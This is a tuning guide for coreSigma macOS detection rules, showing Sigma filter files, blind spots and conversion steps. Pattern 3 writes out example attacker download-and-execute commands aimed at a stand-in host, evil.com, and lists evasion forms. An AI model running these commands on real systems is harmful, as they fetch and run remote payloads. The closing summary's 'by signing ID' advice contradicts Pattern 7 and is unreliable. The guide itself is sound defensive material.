# coreSigma Tuning Guide

This guide shows you how to tune coreSigma detection rules for your environment without modifying the rules themselves. We use **Sigma filters** — a standard mechanism built into pySigma (≥0.11) that applies exclusions and refinements at conversion time.

## Why Sigma Filters?

Rules stay universal and are updated by the community. Your environment-specific exclusions live in a separate filter file that you control. When you convert rules to your SIEM's query language, the filter is applied automatically.

**Key principle:** Every tune must preserve the rule's core detection logic while reducing false positives. Document what you're still catching and any new blind spots.

---

## Pattern 1: Measure Before Cutting

**Don't exclude blindly.** First, understand which hosts and which part of the detection drive the volume.

**Method:**
1. Let the rule run for a representative period (24-72 hours)
2. Group alerts by host, process path, parent process, and command line
3. Identify the specific process path + directory pairs causing noise
4. Apply narrow exclusions

**Example: Compression tools firing on developer workstations**

Before tuning, the `macOS Data Compression Tools` rule fires on every `zip`, `tar`, `gzip` invocation. You measure and find:
- 80% of alerts come from 3 developer hosts
- All involve Xcode's toolchain under `/Applications/Xcode.app/`
- Legitimate use: build processes, not data staging

**After:**

```yaml
title: Xcode Compression Tools Filter
id: 06b1dae3-5ceb-4c6f-aa71-a27642ef1323
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - 5906b20c-036d-46f9-8394-2cc8f711c46b  # macOS Data Compression Tools
  selection:
    Image|startswith: '/Applications/Xcode.app/'
  condition: not selection
```

**Still catches:** compression from any non-Xcode path, including attacker-dropped binaries in `/tmp`, `/Users/Shared`, or masquerading in other `.app` bundles.

**Blind spot:** An adversary who stages their compression inside `/Applications/Xcode.app/` (requires write access to a protected location).

---

## Pattern 2: Pair Process Name with Directory

**Never exclude a process name without its directory.** An adversary can masquerade by copying or naming their binary to match your exclusion.

**Anti-pattern:**
```yaml
# DANGEROUS: excludes any process named 'curl' from any path
selection:
  Image|endswith: '/curl'
```

**Correct pattern:**
```yaml
# Safe: excludes only /usr/bin/curl
selection:
  Image: '/usr/bin/curl'
```

**Example: Curl download detector**

The rule `macOS HTTP Tools with Protocol Indicators` (77d4f6aa-6313-48b5-8575-c78c9e1b184f) detects `curl` with URL arguments. Your software update process triggers it.

**Filter (correct):**

```yaml
title: Legitimate Curl Usage Filter
id: fa45747d-586f-487c-a782-8920f04bc0e7
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - 77d4f6aa-6313-48b5-8575-c78c9e1b184f  # macOS HTTP Tools with Protocol Indicators
  selection:
    Image: '/usr/bin/curl'
    ParentImage|startswith: '/usr/libexec/softwareupdate'
  condition: not selection
```

**Still catches:** `curl` from `/tmp/curl`, `/Users/Shared/curl`, or a renamed binary, even if the adversary copies the legitimate binary.

**Blind spot:** Malicious activity launched by the software update process itself (unlikely, but monitor for anomalies).

---

## Pattern 3: Replace Weak Tokens with Forms Attackers Actually Use

**Generic string matches produce noise.** Instead of excluding benign patterns, tighten the detection logic to **require attacker-specific forms**.

**Example: HTTP tools with protocol indicators**

The rule `macOS HTTP Tools with Protocol Indicators` matches any curl invocation with `http://`, `https://`, or `ftp://` in the command line. This is extremely broad.

**Before (weak, noisy):**
```yaml
detection:
  selection_cmdline:
    CommandLine|contains:
      - http://
      - https://
      - ftp://
```

This fires on:
- Software updates (`https://updates.apple.com`)
- Package managers (`https://github.com/...`)
- Internal documentation (`http://wiki.corp.local`)
- Every developer testing a web service

**After (strengthened with positive filter):**

Use a **positive filter** that requires an attacker form that shows up in curl's own command line: writing the download into a temp directory.

```yaml
title: Curl Attacker Forms Required Filter
id: 9ca7c15c-0021-41cc-aeca-f9236abee1b7
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - 77d4f6aa-6313-48b5-8575-c78c9e1b184f  # macOS HTTP Tools with Protocol Indicators
  selection_attacker_forms:
    # The shell handles |, && and ; before exec, so they never reach curl's argv: match where the download lands.
    # 'o /tmp/' covers curl -o and combined flags such as -fsSLo; 'O /tmp/' covers wget -O. Both cases are listed:
    # Sigma's contains is case-insensitive, but ES|QL and plain keyword fields match case-sensitively.
    CommandLine|contains:
      - 'o /tmp/'
      - 'O /tmp/'
      - 'o /private/tmp/'
      - 'O /private/tmp/'
      - 'o /var/tmp/'
      - 'O /var/tmp/'
      - 'o /dev/shm/'
      - 'O /dev/shm/'
  condition: selection_attacker_forms
```

The filter sees only the command line of the curl, wget or fetch process. The shell handles `|`, `&&` and `;` before exec, so for `curl https://evil.com/payload | sh` the process event carries only `curl https://evil.com/payload`. Tokens such as `| sh` or `&& bash` never match there, and a filter that relies on them silences the rule.

The filter's condition is **ANDed** into the rule, so the detection now fires only when:
1. curl/wget/fetch runs with a URL, AND
2. Its command line writes the download into a temp directory (`-o`, wget's `-O`, or a combined flag such as `-fsSLo`)

List each form in both cases. Sigma's `contains` is case-insensitive, but ES|QL and plain keyword fields compare case-sensitively, so a lowercase `o /tmp/` alone silently filters out `wget -O /tmp/x` there.

**Why this works:** Real 2026 macOS droppers often stage the payload in a temp directory before running it. After the shell splits these chains, curl's or wget's own command line is the part on the right:
- `curl -o /tmp/evil https://evil.com/evil && bash /tmp/evil` → `curl -o /tmp/evil https://evil.com/evil`
- `curl -fsSLo /tmp/x https://evil.com/x; chmod +x /tmp/x; /tmp/x` → `curl -fsSLo /tmp/x https://evil.com/x`
- `wget https://evil.com/script.py -O /tmp/x.py; python /tmp/x.py` → `wget https://evil.com/script.py -O /tmp/x.py`

Benign software updates and package managers don't usually have curl write executables to `/tmp`.

**New false positive:** wget's lowercase `-o` names its log file, so `wget -o /tmp/wget.log https://example.com/x` matches.

**Still catches:** curl or wget command lines with one of the listed forms: `-o` or `-O` (alone or ending a combined flag such as `-fsSLo`), a space, then a path that starts with `/tmp/`, `/private/tmp/`, `/var/tmp/` or `/dev/shm/`, spelled in that case. That holds whether the payload runs in the same command line or later; any other way of writing the same path is a blind spot (below).

**Blind spots:**
- Piping to a shell. `curl https://evil.com/payload | sh` writes nothing to disk, and curl's command line has no pipe in it.
- Downloads outside a temp directory, run later by a different process:
  ```bash
  curl -o ~/Downloads/evil.sh https://evil.com/evil  # not a temp directory
  # (later, different process)
  bash ~/Downloads/evil.sh
  ```
- Staging directories the filter doesn't list: the per-user `$TMPDIR` (`/var/folders/…/T/`, what `curl -o "$TMPDIR/x"` expands to) and `/Users/Shared`.
- Output forms the filter doesn't list: the long `--output /tmp/x`, the path attached to the flag (`-o/tmp/x`, `wget -O/tmp/x`), a directory instead of a file name (`wget -P /tmp/`, `curl --output-dir /tmp -O`).
- Paths written another way: changing into the directory first (`cd /tmp && curl -O https://evil.com/x`, or a relative `-o x` run from `/tmp`), so curl's command line has no temp path at all; an extra slash or dot segment (`-o //tmp/x`, `-o /./tmp/x`); or another case (`-o /TMP/x`: APFS is case-insensitive, so it writes to `/tmp`, but ES|QL and plain keyword fields compare case-sensitively).

These are harder to detect with a single rule but can be caught with:
- Process correlation (curl and a shell started by the same parent, for the pipe)
- File write + execute correlation (for the two-step form)
- Filesystem monitoring for recently-downloaded executables

**Trade-off:** You accept these blind spots because:
- The rule without the filter fires on every download, and a pipe to a shell can't be seen in any single curl event anyway
- The two-step form must write to disk (EDR/XDR detects this), and the file persists longer (forensic recovery possible)

---

## Pattern 4: Dead Filters (Field Absent)

**A filter on a field your EDR doesn't collect passes everything.** This is the most dangerous tuning mistake.

**Detection:**
1. Check the [coreSigma support matrix](SUPPORT_MATRIX.md) for your target backend
2. Look for `field-absent` cells: the rule uses a field no replayed document had on that target
3. Any filter using an absent field is dead code

**Example: excluding DNS lookups by Apple's system services**

You want to exclude DNS tools that Apple's own system services start. Filter on the process that started the tool (`ParentImage`), not on the tool's signature: in `process_creation`, `SigningID` and `TeamID` describe the new process, here `dig`, `nslookup` or `host`, which Apple signs, so `SigningID|startswith: 'com.apple.'` would exclude every run of them, an attacker's included. `/System/Library/` is on the read-only system volume, so a path there can't be planted:

```yaml
title: Apple System Process Filter (by parent path)
id: fe3f7d23-53c0-46e5-92ad-0fecda435b5a
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - 06b33424-75d1-4993-b57f-eca4580b408a  # macOS DNS Query Tools for C2
  selection:
    ParentImage|startswith: '/System/Library/'
  condition: not selection
```

**Check first:** Does your telemetry populate `ParentImage`? The coreSigma ESF collector writes it (`process.parent.executable`). On Falcon, `macos_falcon` has only the parent's basename and fails conversion of a `startswith` on `ParentImage`: a loud failure, not a dead filter. Where the field exists but is empty, this filter excludes nothing.

**Mitigation if field is absent:**
- Use a field your data has, and check it with a test query
- Guard against empty values

**Still catches:** DNS tools started by shells, scripts and anything outside `/System/Library/`, which is where an attacker's commands run.

**Blind spot:** If `ParentImage` is absent in your telemetry and you don't know it, the filter has no effect. Validate with a test query first.

---

## Pattern 5: Filter on the Actor, Not the Mentioned

**Command lines and log messages often mention other processes.** Filter on the **process that acts**, not on text that merely references another process.

**Anti-pattern:**
```yaml
# Wrong: excludes any command line containing 'softwareupdate'
selection:
  CommandLine|contains: 'softwareupdate'
```

**Why this fails:** An attacker can run `/tmp/evil.sh softwareupdate` and bypass your filter. The word appears, but the actor is malicious.

**Correct:**
```yaml
# Right: excludes when softwareupdate is the running process
selection:
  Image: '/usr/sbin/softwareupdate'
```

**Example: Shell script execution**

Your rule detects shell interpreters with suspicious arguments. You want to exclude legitimate admin scripts.

**Wrong:**

```yaml
filter:
  rules:
    - <rule-id>
  selection:
    CommandLine|contains: 'admin_backup.sh'
  condition: not selection
```

An attacker runs: `/tmp/malware.sh --note "admin_backup.sh is safe"` → bypasses filter.

**Right:**

```yaml
filter:
  rules:
    - <rule-id>
  selection:
    Image|endswith: '/admin_backup.sh'
  condition: not selection
```

Now only the script itself is excluded, not processes that mention it.

**Still catches:** Any process whose path doesn't end in `/admin_backup.sh`, including disguised copies.

**Blind spot:** An attacker who copies `admin_backup.sh` to another location and modifies it (mitigated by monitoring for unexpected script modifications).

---

## Pattern 6: Universal vs. Environment-Specific Exclusions

**Universal exclusions** apply to all macOS systems and rarely change:
- Apple's own daemons (`/System/Library/`, signing ID `com.apple.*`)
- Known-good framework behaviors

**Environment-specific exclusions** vary by organization and must be re-baselined:
- MDM agents (Jamf, Kandji, Mosyle)
- EDR/DLP agents (CrowdStrike, SentinelOne, Microsoft Defender)
- Corporate software (Slack, Zoom, Dropbox)

**Method:**
1. Keep two filter files: `universal.yml` and `<your-org>.yml`
2. Re-baseline environment-specific filters quarterly
3. When software is updated or replaced, review filters

**Example: MDM agent**

Your Jamf agent runs `openssl enc` directly during management tasks, which triggers the encryption tool rule.

```yaml
title: Jamf MDM Agent Filter
id: 0358a4c5-ba54-4cc6-9886-bf537e892fbe
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - e7f60a2b-0f79-40d6-b951-d18c4b290906  # macOS Encryption Tool Usage
  selection:
    ParentImage: '/usr/local/jamf/bin/jamf'
  condition: not selection
```

**Re-baseline trigger:** When Jamf is replaced with Kandji, review and update this filter.

**Still catches:** Encryption tool use from any non-Jamf parent process.

**Blind spot:** A compromised Jamf agent encrypting data (mitigated by monitoring Jamf's own integrity and configuration).

**ESF data only.** Falcon records only the parent's file name, so on Falcon this filter would exclude every parent named `jamf`, including an attacker's `/tmp/jamf`. `macos_falcon` therefore refuses to convert a full `ParentImage` path under `not`.

---

## Pattern 7: Scope AI Coding Agent Exclusions to One Agent and One Rule

AI coding agents (Cursor, GitHub Copilot, Windsurf) write and execute arbitrary code. They are **high-value attack vectors** — a compromised agent or malicious extension can run attacker-controlled code with the user's privileges.

**Never blanket-exclude AI agents from all detections.** Exclude them only from **high-noise, low-signal** rules where the benign pattern is clear and frequent.

**Don't identify the agent by `SigningID` or `TeamID` in a `process_creation` filter.** There those fields describe the process being started (`tar`, `curl`, `zsh`), not the agent that started it, so a filter on the agent's signing ID never matches and excludes nothing. Identify the agent by what it starts, as below, or by `ParentImage` where your data has it.

**Example: an npm-installed coding agent and Package Manager Payload to Persistence**

The correlation `Package Manager Payload to Persistence` fires when, for one host and user within 30 minutes, node, bun or deno starts osascript, curl or a fetching shell (base rule `Node or Bun Starts osascript, curl or a Fetching Shell`), and a LaunchAgent, an Apple-named cache file or an agent or IDE configuration file such as `.claude/settings.local.json` is created. A coding agent installed with npm runs under node and does both in an ordinary session: its shell tool runs commands such as `zsh -c "... curl ..."`, and it writes `.claude/settings.local.json` when you approve a permission. That satisfies the correlation with no attack.

Filter the base rule, not the correlation, and take the narrowest cut. npm runs install scripts through `/bin/sh` (its default `script-shell`), and Node's `child_process.exec` uses `/bin/sh` too, so a postinstall payload's first shell is `/bin/sh`. The agent's shell tool runs the user's login shell, `/bin/zsh` by default on macOS:

```yaml
title: npm-Installed Coding Agent Shell Filter
id: a73205f3-7bbb-4e2d-aae2-931d246d7e88
logsource:
  product: macos
  category: process_creation
filter:
  rules:
    - 3da590d3-6c09-4b25-992c-58dff3a069ec  # Node or Bun Starts osascript, curl or a Fetching Shell (base of package_manager_persistence)
  selection:
    Image: '/bin/zsh'
  condition: not selection
```

Convert the filter together with the correlation and its base rules (see [Converting rules](SIGMA_TOOLS_USAGE.md#correlations)); the exclusion lands inside the correlation's first search.

**Still catches:** node, bun or deno starting osascript, curl or wget directly, or `/bin/sh`, `/bin/bash` or `/bin/dash` with a fetch, which covers install scripts run the default way. The agent-config, LaunchAgent and cache-file half of the correlation is unchanged.

**Blind spot:** A payload that deliberately starts `/bin/zsh` from node, or a host whose npm `script-shell` is set to zsh.

**If your agent's shell isn't zsh,** filter on the shell it uses, and check that it isn't the shell your package manager runs scripts with.

---

## Pattern 8: Threshold Noisy Events with Correlation

Some detections are inherently noisy at the single-event level but suspicious when repeated. Use **correlation rules** (Sigma's `correlation` type) to threshold by event count or time window.

**Example: Frequent file deletion**

Deleting one file in `/Library/LaunchDaemons/` could be legitimate maintenance. Deleting 10 files in 60 seconds may indicate anti-forensics or persistence removal.

**Before:** Single-event rule fires on every deletion:

```yaml
title: macOS ESF Deletion In Sensitive Directories
id: 52b5612d-3c9e-4a4a-9b7a-1b6f94b6a0aa
logsource:
  product: macos
  category: file_delete
detection:
  selection_path:
    TargetFilename|startswith:
      - /Library/LaunchDaemons/
      - /Library/LaunchAgents/
  condition: selection_path
level: medium
```

**After:** Correlation rule thresholds by count:

```yaml
title: Bulk File Deletion in Sensitive Directories
id: 170d1e06-829a-4c1c-b453-afa456670031
correlation:
  type: event_count
  rules:
    - 52b5612d-3c9e-4a4a-9b7a-1b6f94b6a0aa
  group-by:
    - User
    - Image
  timespan: 60s
  condition:
    gte: 10
  generate: true  # keep the single-event rule's own alerts too
level: high
```

**Still catches:** 10+ deletions in 60 seconds from the same user and process.

**Blind spot:** Slow, deliberate deletion campaigns below the threshold (e.g., one file per minute). Mitigate by also keeping the low-severity single-event rule active: `generate: true` keeps its own query, which a correlation's base rule otherwise doesn't produce.

**Backend limits:** EQL has no `event_count` (it runs only `temporal_ordered`, as a `sequence`), so `deploy_sigma_rules.py` deploys this rule to Kibana as ES|QL, which counts in fixed windows of the timespan. Splunk also counts in fixed `bin` windows. On both, a burst that crosses a window boundary can fall below the threshold in both windows. ClickHouse counts over the whole search range, and OpenSearch has no correlations. See the [support matrix](SUPPORT_MATRIX.md) notes.

---

## Pattern 9: Document What You Still Catch

**Every filter must include:**
1. **Still catches:** What malicious behavior still triggers the rule
2. **Blind spot:** What attack pattern is now invisible
3. **Why acceptable:** The trade-off justification (volume reduction, environment context, compensating control)

**Example:**

```yaml
# Filter: Xcode Compression Tools
# Still catches: Compression from /tmp, /Users/Shared, /Applications/<other>.app
# Blind spot: Adversary writes /Applications/Xcode.app/Contents/MacOS/evil-tar
# Why acceptable: /Applications/Xcode.app requires admin or TCC bypass to write;
#                 other detections (unexpected process in Xcode bundle, unsigned binary)
#                 would fire first
```

This documentation lives in your filter file as a comment block, and in your SIEM's alert description field.

**Method:**
1. Before deploying a filter, test it against known-good and known-bad samples
2. Document the blind spot explicitly
3. Identify compensating controls (other rules, DLP, MDM telemetry)
4. Schedule a filter review when the compensating control changes

---

## Applying Filters

### With sigma-cli

```bash
sigma convert -t <backend> -p macos_esf_ecs -p macos_ul_ecs \
  --filter filters/universal.yml \
  --filter filters/myorg.yml \
  rules/esf/
```

A filter on a correlation's base rule needs the correlation and its base rules in one input directory, as in [Converting rules](SIGMA_TOOLS_USAGE.md#correlations).

### With pySigma in Python

```python
from pathlib import Path
from sigma.collection import SigmaCollection
from sigma.backends.splunk import SplunkBackend
from sigma.pipelines.macos import macos_esf_ecs, macos_ul_ecs

# Combine rules and filters (directories are searched recursively)
combined = SigmaCollection.load_ruleset([
    Path("rules/esf"),
    Path("filters/universal.yml"),
    Path("filters/myorg.yml"),
])

backend = SplunkBackend(macos_esf_ecs() + macos_ul_ecs())
queries = backend.convert(combined)
```

---

## Example Filters

See `filters/examples/` for working filter examples covering each pattern:
- `xcode_compression.yml` - Pattern 1 (measure before cutting)
- `legitimate_curl.yml` - Pattern 2 (pair name + directory)
- `attacker_forms_required.yml` - Pattern 3 (replace weak tokens with attacker forms)
- `apple_system_processes.yml` - Pattern 4 (dead filters; filter on the actor's path)
- `mdm_agent.yml` - Pattern 6 (environment-specific exclusions)
- `coding_agent_shell.yml` - Pattern 7 (an npm-installed coding agent and the package-manager correlation)

`tests/test_filters.py` converts each filter with the rule it references (pySigma 1.5.1).

---

## Support Matrix

Some fields in coreSigma rules may not be available on all target backends. Check the [support matrix](SUPPORT_MATRIX.md) before creating filters that depend on specific fields. A `field-absent` cell means no replayed document on that target had a field the rule uses; filters on such a field are dead code. A `✗ fails` cell often names a field the target's pipeline doesn't map.

---

## Summary

1. **Measure first:** Understand volume sources before excluding
2. **Pair name + directory:** Never exclude by name alone
3. **Replace weak tokens:** Match attacker patterns, not generic strings
4. **Dead filters:** Check field support for your backend
5. **Filter the actor:** Not text that mentions another process
6. **Universal vs. environment:** Separate and re-baseline regularly
7. **AI agents:** Exclude sparingly, by signing ID, with documented trade-offs
8. **Threshold noisy events:** Use correlation rules for event_count logic
9. **Document trade-offs:** Still catches, blind spots, why acceptable

**Tuning is an iterative process.** Start with the noisiest rules, apply narrow filters, measure the reduction, and iterate. Never tune based on assumptions — always measure first.
